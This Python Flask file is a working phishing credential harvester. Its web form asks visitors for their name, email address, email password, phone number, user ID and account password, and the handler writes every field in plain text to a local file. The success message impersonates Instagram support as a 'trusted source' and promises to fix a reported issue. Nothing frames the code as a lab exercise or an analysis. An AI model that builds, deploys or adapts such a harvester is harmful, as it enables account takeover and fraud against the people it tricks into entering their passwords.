from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        firstname = request.form['firstname']
        lastname = request.form['lastname']
        email = request.form['email']
        epassword = request.form['epassword']
        mobile = request.form['mobile']
        userid = request.form['userid']
        password = request.form['password']
        repassword = request.form['repassword']

        # Save the data to a file
        with open('submitted_details.txt', 'a') as f:
            f.write('First Name: {}\n'.format(firstname))
            f.write('Last Name:  {}\n'.format(lastname))
            f.write('Email: {}\n'.format(email))
            f.write('Email Password: {}\n'.format(epassword))
            f.write('Mobile: {}\n'.format(mobile))
            f.write('Userid: {}\n'.format(userid))
            f.write('Password: {}\n'.format(password))
            f.write('re enter password: {}\n'.format(repassword))
            

        return "Details submitted successfully! Thank you for your confirmation! We will fix your reported issue. (Instagram user trusted source)"

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
